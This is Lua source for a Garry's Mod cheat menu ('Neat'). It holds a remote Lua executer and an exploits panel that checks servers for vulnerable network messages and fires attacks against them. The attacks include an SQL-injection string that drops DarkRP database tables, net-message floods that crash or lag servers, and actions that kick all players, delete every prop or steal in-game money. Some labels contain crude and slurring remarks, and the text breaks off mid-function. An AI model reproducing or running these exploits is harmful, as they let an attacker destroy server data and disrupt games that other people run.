    local a5 = vgui.Create("DButton", aV)
    a5:SetText("")
    a5:SetSize(180, 30)
    a5:SetPos(6, 30)
    a5.DoClick = function()
        if IsValid(rtx) then rtx:Remove() end
        rtx = vgui.Create("RichText", aV)
        rtx:SetPos(195, 30)
        rtx:SetSize(500, 350)
        rtx:InsertColorChange(255, 255, 255, 255)
        rtx:AppendText(Lemos_log_kills)
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(killdss, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DButton", aV)
    a5:SetText("")
    a5:SetSize(180, 30)
    a5:SetPos(6, 67)
    a5.DoClick = function()
        if IsValid(rtx) then rtx:Remove() end
        rtx = vgui.Create("RichText", aV)
        rtx:SetPos(195, 30)
        rtx:SetSize(500, 350)
        rtx:InsertColorChange(255, 255, 255, 255)
        rtx:AppendText(Lemos_log_chat)
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(Chat_l, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DButton", aV)
    a5:SetText("")
    a5:SetSize(180, 30)
    a5:SetPos(6, 105)
    a5.DoClick = function()
        if IsValid(rtx) then rtx:Remove() end
        rtx = vgui.Create("RichText", aV)
        rtx:SetPos(195, 30)
        rtx:SetSize(500, 350)
        rtx:InsertColorChange(255, 255, 255, 255)
        rtx:AppendText(Lemos_log_disconnect)
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(disconnect, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DButton", aV)
    a5:SetText("")
    a5:SetSize(180, 30)
    a5:SetPos(6, 143)
    a5.DoClick = function()
        if IsValid(rtx) then rtx:Remove() end
        rtx = vgui.Create("RichText", aV)
        rtx:SetPos(195, 30)
        rtx:SetSize(500, 350)
        rtx:InsertColorChange(255, 255, 255, 255)
        rtx:AppendText(Lemos_log_connect)
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(connect, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DButton", aV)
    a5:SetText("")
    a5:SetSize(180, 30)
    a5:SetPos(6, 343)
    a5.DoClick = function()
        if IsValid(rtx) then rtx:Remove() end
        Lemos_log_kills = ""
        Lemos_log_chat = ""
        Lemos_log_connect = ""
        Lemos_log_disconnect = ""
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(clearlog, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end
end

local function aW()
    local function aX(aY)
        return math.Round(aY, 0)
    end

    pos = LocalPlayer():GetPos()
    fdg = aX(pos.z)
    fdg = fdg + 300
    Ekran_vector = Vector(aX(pos.x), aX(pos.y), fdg)
    dfgdfgdfg = 90
    Ekran_andle = Angle(0, dfgdfgdfg, 90)
    local function aZ(a_)
        if IsValid(Lemos_youtube) then
            html:Remove()
            Lemos_youtube:Close()
        end

        Lemos_youtube = vgui.Create("DFrame")
        Lemos_youtube:SetTitle("")
        Lemos_youtube:SetSize(400, 253)
        Lemos_youtube:ShowCloseButton(false)
        Lemos_youtube:SetPaintedManually(true)
        Lemos_youtube.Paint = function() end
        html = vgui.Create("DHTML", Lemos_youtube)
        html:Dock(FILL)
        html:OpenURL('https://www.youtube.com/embed/' .. a_ .. '?autoplay=1')
        hook.Add("PostDrawOpaqueRenderables", "Lemos_youtube_hook", function()
            cam.Start3D2D(Ekran_vector, Ekran_andle, 1)
            draw.RoundedBox(0, 0, 20, 400, 233, Color(255, 70, 70, 255))
            if IsValid(Lemos_youtube) then Lemos_youtube:PaintManual() end
            cam.End3D2D()
        end)
    end

    local okeyss = vgui.Create("DFrame")
    okeyss:SetSize(300, 260)
    okeyss:Center()
    okeyss:SetTitle("")
    okeyss:SetVisible(true)
    okeyss:SetDraggable(true)
    okeyss:ShowCloseButton(false)
    okeyss:MakePopup()
    okeyss.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, okeyss:GetWide(), okeyss:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, okeyss:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, okeyss:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - tv", "Roboto", okeyss:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        draw.SimpleText("'youtube.com/watch?v=VuntgLux6J8'", "exitmenu", 5, 165, Color(255, 255, 255, 200), 0, 0)
        draw.SimpleText("= 'VuntgLux6J8'", "exitmenu", 5, 180, Color(255, 255, 255, 200), 0, 0)
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:SetPos(okeyss:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() okeyss:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:Dock(TOP)
    a5:DockMargin(1, 9, 1, -5)
    a5:DockPadding(2, 22, 2, 22)
    a5.DoClick = function()
        fdg = fdg + 50
        Ekran_vector = Vector(aX(pos.x), aX(pos.y), fdg)
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(Up, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:Dock(TOP)
    a5:DockMargin(1, 9, 1, -5)
    a5:DockPadding(2, 22, 2, 22)
    a5.DoClick = function()
        fdg = fdg - 50
        Ekran_vector = Vector(aX(pos.x), aX(pos.y), fdg)
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(Down, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:Dock(TOP)
    a5:DockMargin(1, 9, 1, -5)
    a5:DockPadding(2, 22, 2, 22)
    a5.DoClick = function()
        dfgdfgdfg = dfgdfgdfg - 90
        Ekran_andle = Angle(0, dfgdfgdfg, 90)
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(Right, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:Dock(TOP)
    a5:DockMargin(1, 9, 1, -5)
    a5:DockPadding(2, 22, 2, 22)
    a5.DoClick = function()
        dfgdfgdfg = dfgdfgdfg + 90
        Ekran_andle = Angle(0, dfgdfgdfg, 90)
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(Left, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:Dock(TOP)
    a5:DockMargin(1, 9, 1, -5)
    a5:DockPadding(2, 22, 2, 22)
    a5.DoClick = function()
        if IsValid(Lemos_youtube) then
            html:Remove()
            Lemos_youtube:Close()
        end
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(Stop, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:SetPos(5, 227)
    a5:SetSize(290, 22)
    a5.DoClick = function()
        pos = LocalPlayer():GetPos()
        fdg = aX(pos.z)
        fdg = fdg + 300
        Ekran_vector = Vector(aX(pos.x), aX(pos.y), fdg)
        dfgdfgdfg = 90
        Ekran_andle = Angle(0, dfgdfgdfg, 90)
        aZ(edit:GetValue())
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(Start, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    edit = vgui.Create("DTextEntry", okeyss)
    edit:SetPos(5, 200)
    edit:SetSize(290, 22)
    edit:SetText("VuntgLux6J8")
end

local function b0()
    local b1 = {}
    b1.URL = "http://metastruct.github.io/lua_editor/"
    b1.COMPILE = "C"
    local b2 = {
        ["\\"] = "\\\\",
        ["\0"] = "\\0",
        ["\b"] = "\\b",
        ["\t"] = "\\t",
        ["\n"] = "\\n",
        ["\v"] = "\\v",
        ["\f"] = "\\f",
        ["\r"] = "\\r",
        ["\""] = "\\\"",
        ["\'"] = "\\\'"
    }

    function b1:Init()
        self.Code = ""
        self.ErrorPanel = self:Add("DButton")
        self.ErrorPanel:SetFont('BudgetLabel')
        self.ErrorPanel:SetTextColor(Color(255, 255, 255))
        self.ErrorPanel:SetText("")
        self.ErrorPanel:SetTall(0)
        self.ErrorPanel.DoClick = function() self:GotoErrorLine() end
        self.ErrorPanel.DoRightClick = function(self) SetClipboardText(self:GetText()) end
        self.ErrorPanel.Paint = function(self, t, u)
            surface.SetDrawColor(255, 50, 50)
            surface.DrawRect(0, 0, t, u)
        end

        self:StartHTML()
    end

    function b1:Think()
        if self.NextValidate and self.NextValidate < CurTime() then self:ValidateCode() end
    end

    function b1:StartHTML()
        self.HTML = self:Add("DHTML")
        self:AddJavascriptCallback("OnCode")
        self:AddJavascriptCallback("OnLog")
        self.HTML:OpenURL(self.URL)
        self.HTML:RequestFocus()
    end

    function b1:ReloadHTML()
        self.HTML:OpenURL(self.URL)
    end

    function b1:JavascriptSafe(q)
        q = q:gsub(".", b2)
        q = q:gsub("\226\128\168", "\\\226\128\168")
        q = q:gsub("\226\128\169", "\\\226\128\169")
        return q
    end

    function b1:CallJS(b3)
        self.HTML:Call(b3)
    end

    function b1:AddJavascriptCallback(ae)
        local func = self[ae]
        self.HTML:AddFunction("gmodinterface", ae, function(...) func(self, HTML, ...) end)
    end

    function b1:OnCode(j, ag)
        self.NextValidate = CurTime() + 0.2
        self.Code = ag
    end

    function b1:OnLog(j, ...)
        print(...)
    end

    function b1:SetCode(ag)
        self.Code = ag
        self:CallJS('SetContent("' .. self:JavascriptSafe(ag) .. '");')
    end

    function b1:GetCode()
        return 'local me=Entity(' .. LocalPlayer():EntIndex() .. ') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos ' .. self.Code
    end

    function b1:SetGutterError(b4, b5)
        self:CallJS("SetErr('" .. b4 .. "','" .. self:JavascriptSafe(b5) .. "')")
    end

    function b1:GotoLine(b6)
        self:CallJS("GotoLine('" .. b6 .. "')")
    end

    function b1:ClearGutter()
        self:CallJS("ClearErr()")
    end

    function b1:GotoErrorLine()
        self:GotoLine(self.ErrorLine and 1)
    end

    function b1:SetError(b7)
        if not IsValid(self.HTML) then
            self.ErrorPanel:SetText("")
            self:ClearGutter()
            return
        end

        local b8 = 0
        if b7 then
            local a9, b7 = string.match(b7, self.COMPILE .. ":(%d*):(.+)")
            if a9 and b7 then
                b8 = 20
                self.ErrorPanel:SetText(a9 and b7 and "Line " .. a9 .. ": " .. b7 and b7 and "")
                self.ErrorLine = tonumber(string.match(b7, " at line (%d)%)") and a9) and 1
                self:SetGutterError(self.ErrorLine, b7)
            end
        else
            self.ErrorPanel:SetText("")
            self:ClearGutter()
        end

        local b9 = self:GetWide()
        local ba = self:GetTall()
        self.ErrorPanel:SetPos(0, ba - b8)
        self.ErrorPanel:SetSize(b9, b8)
        self.HTML:SetSize(b9, ba - b8)
    end

    function b1:ValidateCode()
        local bb = SysTime()
        local ag = self:GetCode()
        self.NextValidate = nil
        if not ag and ag == "" then
            self:SetError()
            return
        end

        local bc = CompileString(ag, self.COMPILE, false)
        bb = SysTime() - bb
        if type(bc) == "string" then
            self:SetError(bc)
        elseif bb > 0.25 then
            self:SetError("Compiling took too long. (" .. math.Round(bb * 1000) .. ")")
        else
            self:SetError()
        end
    end

    function b1:PerformLayout(t, u)
        local b8 = self.ErrorPanel:GetTall()
        self.ErrorPanel:SetPos(0, u - b8)
        self.ErrorPanel:SetSize(t, b8)
        self.HTML:SetSize(t, u - b8)
    end

    vgui.Register("lua_executer", b1, "EditablePanel")
    local bd = vgui.Create('DFrame')
    bd:SetSize(ScrW() / 2, ScrH() / 2)
    bd:SetTitle('LUA Executer')
    bd:Center()
    bd:SetSizable(true)
    bd:MakePopup()
    bd:ShowCloseButton(false)
    bd.Paint = function(self, t, u)
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect(0, 0, t, 25)
        surface.SetDrawColor(0, 0, 0)
        surface.DrawRect(0, 25, t, u - 25)
    end

    local be = vgui.Create("DButton", bd)
    be:SetSize(40, 23)
    be:SetText("")
    be.Paint = function(self, t, u)
        surface.SetDrawColor(196, 80, 80)
        surface.DrawRect(0, 0, t, u)
        surface.SetFont("marlett")
        local s, bf = surface.GetTextSize("r")
        surface.SetTextPos(t / 2 - s / 2, u / 2 - bf / 2)
        surface.SetTextColor(255, 255, 255)
        surface.DrawText("r")
    end

    be.DoClick = function() bd:SetVisible(not bd:IsVisible()) end
    local bg = vgui.Create('lua_executer', bd)
    bg:SetPos(5, 55)
    bd.PerformLayout = function(self, t, u)
        be:SetPos(t - 41, 1)
        bg:SetSize(t - 10, u - 60)
    end

    local bh = 5
    local function bi(b9, g, bj, bk)
        local bl = Material(bj)
        local bm = vgui.Create('DButton', bd)
        bm:SetText('')
        bm.Paint = function(self, t, u)
            if self.Hovered then
                if self.Depressed then
                    surface.SetDrawColor(90, 90, 90)
                else
                    surface.SetDrawColor(70, 70, 70)
                end
            else
                surface.SetDrawColor(40, 40, 40)
            end

            surface.DrawRect(0, 0, t, u)
            surface.SetDrawColor(255, 255, 255)
            surface.SetMaterial(bl)
            surface.DrawTexturedRect(5, u / 2 - 8, 16, 16)
            draw.SimpleText(g, 'BudgetLabel', 26, u / 2, Color(255, 255, 255), 0, 1)
        end

        bm.DoClick = bk
        bm:SetSize(b9, 20)
        bm:SetPos(bh, 30)
        bh = bh + b9 + 5
    end

    bi(115, "Send LUA", 'icon16/arrow_down.png', function()
        local ag = bg:GetCode()
        RunString(ag)
    end)
end

local function bn()
    s = {}
    df = 0
    refdgdg = 0
    okeyss = vgui.Create("DFrame")
    okeyss:SetSize(300, 387)
    okeyss:Center()
    okeyss:SetTitle("")
    okeyss:SetVisible(true)
    okeyss:ShowCloseButton(false)
    okeyss:SetDraggable(true)
    okeyss:MakePopup()
    okeyss.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, okeyss:GetWide(), okeyss:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, okeyss:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, okeyss:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - exploits", "Roboto", okeyss:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if df == 0 then draw.SimpleText(not_found_exploits, 'Roboto', 30, 40, Color(255, 255, 255, 255)) end
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:SetPos(okeyss:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() okeyss:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    ggggg = vgui.Create("DScrollPanel", okeyss)
    ggggg:Dock(FILL)
    function addExploit(z, ae, z, func)
        df = df + 1
        local a5 = vgui.Create("DButton", ggggg)
        a5:SetText("")
        a5:Dock(TOP)
        a5:DockMargin(1, 9, 1, -5)
        a5:DockPadding(2, 22, 2, 22)
        a5.Paint = function(a6, t, u)
            draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
            draw.SimpleText(ae, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
        end

        a5.DoClick = func
    end

    ECPrint = function() end
    status = ValidNetString("orgcheckname")
    if status then
        addExploit("1", "Краш базы даркрп", "Gets All Ammo Types", function()
            local b = [['; DROP TABLE darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING); —]]
            net.Start('orgcheckname')
            net.WriteString(b)
            net.SendToServer()
        end)
    end

    status = ValidNetString("restartmapnow")
    if status then
        addExploit("1", "Перезгрузить карту", "Gets All Ammo Types", function()
            net.Start('restartmapnow')
            net.SendToServer()
        end)
    end

    status = ValidNetString("SPAWNPROTECTIONVALUE")
    if status then
        addExploit("1", "spam protect lemosa", "Gets All Ammo Types", function()
            for f = 1, 100000000000 do
                net.Start("SPAWNPROTECTIONVALUE")
                net.SendToServer()
            end
        end)
    end

    status = ValidNetString("TCBBuyAmmo")
    if status then
        ECPrint("Found Exploit: Free Ammo [TCBBuyAmmo]")
        addExploit("1", "Free Ammo", "Gets All Ammo Types", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            ECPrint("Getting Le Ammo")
            for x, p in pairs(GAMEMODE.AmmoTypes) do
                net.Start("TCBBuyAmmo")
                net.WriteTable({nil, p.ammoType, nil, "0", "999999"})
                net.SendToServer()
            end
        end)
    end

    status = ValidNetString("DataSend")
    if status then
        ECPrint("Found Exploit: Steal All Monies #1 [DataSend]")
        addExploit("2", "Steal All Monies #1", "Takes money from printers", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            for x, p in pairs(ents.GetAll()) do
                if p:GetClass() == "adv_moneyprinter" then
                    ECPrint("Collecting Money")
                    net.Start("DataSend")
                    net.WriteFloat(2)
                    net.WriteEntity(p)
                    net.WriteEntity(LocalPlayer())
                    net.SendToServer()
                end
            end
        end)
    end

    status = ValidNetString("FarmingmodSellItems")
    if status then
        ECPrint("Found Exploit: Free Money [FarmingmodSellItems]")
        addExploit("3", "Free Money", "An exploit in the Farming Mod", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            ECPrint("Enjoy the b1g monies")
            net.Start("FarmingmodSellItems")
            net.WriteTable({
                Cost = 10,
                CropModel = "models/props/eryk/garlic.mdl",
                CropType = 2,
                Info = "Garlic Seed",
                Model = "models/props/eryk/seedbag.mdl",
                Name = "Garlic",
                Quality = 4,
                Sell = 99999,
                Type = "Seed"
            })

            net.WriteInt(1, 16)
            net.SendToServer()
        end)
    end

    status = ValidNetString("start_wd_emp")
    if status then
        ECPrint("Found Exploit: Hack Keypad [start_wd_emp]")
        addExploit("4", "Hack Keypad", "Instantly opens nearby keypads. Has a cooldown", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            ECNotify("Hacking Keypads")
            net.Start("start_wd_emp")
            net.SendToServer()
        end)
    end

    status = ValidNetString("duelrequestguiYes")
    if status then
        ECPrint("Found Exploit: Get Money [duelrequestguiYes]")
        addExploit("5", "Get Money", "Duel Exploit", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            ECNotify("getting ez monies")
            net.Start("duelrequestguiYes")
            net.WriteInt(-99999999999999999999999999999999999999999999999999999999999999999999999999999, 32)
            net.WriteEntity(table.Random(player.GetAll()))
            net.WriteString("Crossbow")
            net.SendToServer()
        end)
    end

    status = ValidNetString("DarkRP_Kun_ForceSpawn")
    if status then
        ECPrint("Found Exploit: Respawn #1 [DarkRP_Kun_ForceSpawn]")
        addExploit("6", "Respawn #1", "Just respawn", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            ECPrint("Respawn")
            net.Start("DarkRP_Kun_ForceSpawn")
            net.SendToServer()
        end)
    end

    status = ValidNetString("SyncPrinterButtons76561198056171650")
    if status then
        ECPrint("Found Exploit: Steal All Monies #2 [SyncPrinterButtons76561198056171650]")
        addExploit("7", "Steal All Monies #2", "Takes money from printers", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            ECPrint("Collecting Money")
            for x, p in pairs(ents.GetAll()) do
                if p:GetClass() == "adv_moneyprinter" then
                    net.Start("SyncPrinterButtons76561198056171650")
                    net.WriteEntity(p)
                    net.WriteUInt(2, 4)
                    net.SendToServer()
                end
            end
        end)
    end

    local function bo()
        for l = 1, 2000 do
            net.Start("DL_Answering")
            net.SendToServer()
        end
    end

    if Damagelog then
        ECPrint("Found Exploit: Kick All Players")
        reportSpam = 0
        addExploit("1337", "Kick All Players", "Kicks all players", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            if reportSpam == 0 then
                ECNotify("Starting Kicker")
                reportSpam = 1
                timer.Create("reportSpammer", 0.05, 0, bo)
            else
                ECNotify("Stopping Kicker")
                reportSpam = 0
                timer.Remove("reportSpammer")
            end
        end)
    end

    status = ValidNetString("SimplicityAC_aysent")
    if status then
        ECPrint("Found Exploit: Crash #1 [SimplicityAC_aysent]")
        addExploit("8", "Crash #1", "Will instantly crash the server", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            ECPrint("Goodbye Server")
            local bp = {}
            for l = 1, 400 do
                bp[l] = l
            end

            net.Start("SimplicityAC_aysent")
            net.WriteUInt(1, 8)
            net.WriteUInt(4294967295, 32)
            net.WriteTable(bp)
            net.SendToServer()
        end)
    end

    status = ValidNetString("RevivePlayer")
    if status then
        ECPrint("Found Exploit: Reanimation #1 [RevivePlayer]")
        addExploit("9", "Reanimation #1", "Instant revival", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            if not timer.Exists("reanimation1") then
                ECNotify("Enabled")
                timer.Create("reanimation1", 0.5, 0, function()
                    if not LocalPlayer():Alive() then
                        net.Start("RevivePlayer")
                        net.WriteEntity(LocalPlayer())
                        net.SendToServer()
                    end
                end)
            else
                timer.Remove("reanimation1")
                ECNotify("Disabled")
            end
        end)
    end

    status = ValidNetString("NLRKick")
    if status then
        ECPrint("Found Exploit: Kick Everyone [NLRKick]")
        addExploit("10", "Kick Everyone", "kick all the beaners", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            ECNotify("Kicking All")
            for x, p in pairs(player.GetAll()) do
                if not p == LocalPlayer() then
                    net.Start("NLRKick")
                    net.WriteEntity(p)
                    net.SendToServer()
                end
            end
        end)
    end

    status = ValidNetString("timebombDefuse")
    if status then
        ECPrint("Found Exploit: Delete All Props [timebombDefuse]")
        addExploit("11", "Delete All Props", "props = dead", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            ECNotify("Props De_Stroyed")
            for x, p in pairs(ents.GetAll()) do
                net.Start("timebombDefuse")
                net.WriteEntity(p)
                net.WriteBool(true)
                net.SendToServer()
            end
        end)
    end

    status = ValidNetString("NDES_SelectedEmblem")
    if status then
        ECPrint("Found Exploit: Lagger #2 [NDES_SelectedEmblem]")
        addExploit("12", "Lagger #2", "oof yuh get l4gged", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            if not timer.Exists("lagger2") then
                timer.Create("lagger2", 0.5, 0, function()
                    for l = 1, 2000 do
                        net.Start("NDES_SelectedEmblem", true)
                        net.WriteString("seized")
                        net.SendToServer()
                    end
                end)

                ECNotify("Starting Lagger")
            else
                timer.Remove("lagger2")
                ECNotify("Stopping Lagger")
            end
        end)
    end

    status = ValidNetString("Morpheus.StaffTracker")
    if status then
        ECPrint("Found Exploit: Crasher #1 [Morpheus.StaffTracker]")
        addExploit("13", "Crasher #1", "not even hard. unlike nippy's dick when he sees voltz", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            if not timer.Exists("crasher1") then
                timer.Create("crasher1", 0.5, 0, function()
                    for l = 1, 2000 do
                        net.Start("Morpheus.StaffTracker")
                        net.SendToServer()
                    end
                end)

                ECNotify("Crashing Server")
            else
                timer.Remove("crasher1")
                ECNotify("Canceling Crasher")
            end
        end)
    end

    status = ValidNetString("egg")
    if status then
        ECPrint("Found Exploit: Get Easter Egg")
        addExploit("14", "Get Easter Egg", "ez eggs", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            RunConsoleCommand("say", "4bigz")
            RunConsoleCommand("cc_egg2")
            net.Start("egg")
            net.SendToServer()
            ECNotify("Gave Easter Egg")
        end)
    end

    status = ValidNetString("NetData")
    if status then
        ECPrint("Found Exploit: Outfit player nouser [NetData]")
        addExploit("1337", "Outfit player nouser", "Just noise players near u (discovered by Solly)", function()
            surface.PlaySound("garrysmod/ui_click.wav")
            ECNotify("Starting")
            for x, p in pairs(player.GetAll()) do
                net.Start("NetData")
                net.WriteString("OF")
                net.WriteUInt(4, 8)
                net.WriteData(math.random(100000, 9999999) .. ",sis.mdl", 30)
                net.SendToServer()
            end
        end)
    end
end

local function bq()
    local NEAT = vgui.Create("DFrame")
    NEAT:SetSize(310, 80)
    NEAT:Center()
    NEAT:SetTitle("")
    NEAT:SetVisible(true)
    NEAT:SetDraggable(true)
    NEAT:ShowCloseButton(false)
    NEAT:MakePopup()
    NEAT.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, NEAT:GetWide(), NEAT:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, NEAT:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, NEAT:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - " .. FakeMoney, "Roboto", NEAT:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", NEAT)
    a5:SetText("")
    a5:SetPos(NEAT:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() NEAT:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a5 = vgui.Create("DLabel")
    a5:SetParent(NEAT)
    a5:SetText(EnterMoney)
    a5:SetPos(10, 25)
    a5:SetSize(7000, 20)
    a5:SetTextColor(Color(255, 255, 255, 255))
    local a5 = vgui.Create("DButton", NEAT)
    a5:SetText("")
    a5:SetPos(275, 50)
    a5:SetSize(30, 20)
    a5.DoClick = function() if DarkRP then setMoney(edit:GetValue()) end end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
